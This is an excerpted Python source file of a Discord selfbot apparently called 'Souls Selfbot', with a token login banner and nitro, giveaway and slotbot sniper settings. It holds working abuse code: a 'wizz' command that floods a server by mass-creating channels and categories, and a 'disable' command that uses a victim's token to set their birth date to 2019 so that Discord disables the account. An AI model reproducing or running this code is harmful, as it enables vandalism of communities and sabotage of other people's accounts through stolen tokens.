...
def Init():
    if config.get('token') == "token-here":
        ...
        try:
            ...
            os.system(f'title (Souls Selfbot) - Version {NUKER.__version__}')
...
████████████████████████████████████████████████████████████████████████████
                       ...
                       {Fore.RED}Made by 12tacey/0souls
    ''')
    print(f'{Fore.BLACK}                      Version | {NUKER.__version__}')
    print(f'{Fore.BLACK}                      Logged in as: | {bot.user.name}  {bot.user.discriminator}'
   f'{Fore.BLACK}   |   User ID | {bot.user.id}')
    print(f'{Fore.BLACK}                      Prefix | {prefix}')
    print(f'{Fore.BLACK}                      Nitro Sniper | {nitro}')
    print(f'{Fore.BLACK}                      Giveaway Sniper | {giveaway}') 
    print(f'{Fore.BLACK}                      Slotbot Sniper | {slotbot}')
    headers = {
      'Authorization': token,
...
async def wizz(ctx):
    ...
    show_avatar.set_image(url='https://media.giphy.com/media/Y4KXeBmMRGiqsqDliW/giphy.gif')
    ...
    for i in range(1, 25):
              await ctx.guild.create_text_channel(name=f'被灵魂所困扰 {i}')
              await ctx.guild.create_voice_channel(name=f'被灵魂所困扰 {i}')
              await ctx.guild.create_category(name=f'被灵魂所困扰 {i}')
...
async def disable(ctx, _token):
    await ctx.message.delete()
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': _token}, json={'date_of_birth': '2019-12-04'})
